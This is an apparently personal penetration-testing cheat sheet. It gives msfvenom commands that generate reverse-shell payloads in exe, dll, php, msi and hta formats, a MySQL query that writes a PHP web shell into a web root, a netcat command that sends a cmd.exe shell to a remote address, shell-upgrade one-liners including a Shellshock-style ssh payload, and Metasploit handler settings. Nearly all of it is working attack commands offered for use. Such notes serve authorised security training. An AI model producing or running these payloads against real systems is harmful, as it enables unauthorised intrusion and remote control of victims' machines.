### MSFVENOM

#### reverse shell in .exe - REQUIRE metasploit multi handler

- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.207 LPORT=4444 -f exe -o reverse.exe

#### reverse shell in .exe - nc -nvlp 4444 is good

- msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.212 LPORT=445 -f exe > rev.exe

#### dll reverse 32bit

- msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.207 LPORT=4444 -f dll -a x86 --platform windows -e x86/xor_dynamic -b '\x00' -o test.dll

#### dll reverse shell

- msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.229 LPORT=9999 -f dll -o myDLL.dll

#### reverse shell in php - window

- msfvenom -p php/reverse_php LHOST=192.168.49.57 LPORT=443 -f raw -o shell.php

#### .MSI file

- msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.207 LPORT=80 -f msi -o shell.msi

#### .HTA files for office/libreoffice

- msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.207 LPORT=80 -f hta-psh -o tmp.hta

#### mySQL

write a file out to writable web root directory window & linux version

- select "<?php echo shell_exec($_GET['c']);?>" into OUTFILE 'C:/wamp/www/webshell.php'

#### Window

can upload nc.exe when have the reverse shell and use ```

- powershell nc.exe 192.168.49.57 80 -e cmd.exe

---

### Shell Upgrade

- run `export TERM=xterm` first after getting a shell

Upgrade shell with bash

- script /dev/null -c bash

Restricted shell rbash

- If you have a restricted bash shell aka rbash, try https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash#get-bash-from-ssh

Get directly an interactive shell

- ssh -t user@$ip bash
- ssh user@$ip -t "bash --noprofile -i"
- ssh user@$ip -t "() { :; }; sh -i "

restricted rbash

- ssh user@$ip -t bash

Upgrade shell with Python

- which python3
- python3 -c 'import pty;pty.spawn("/bin/bash")'
- python -c 'import pty;pty.spawn("bin/bash")'

follow up with

- stty raw -echo

---

### Multi Handler Shell

payload for window -> `set payload windows/meterpreter/reverse_tcp`
payload for linux -> `set payload linux/x64/meterpreter/reverse_tcp` or `set payload linux/x86/meterpreter/reverse_tcp`
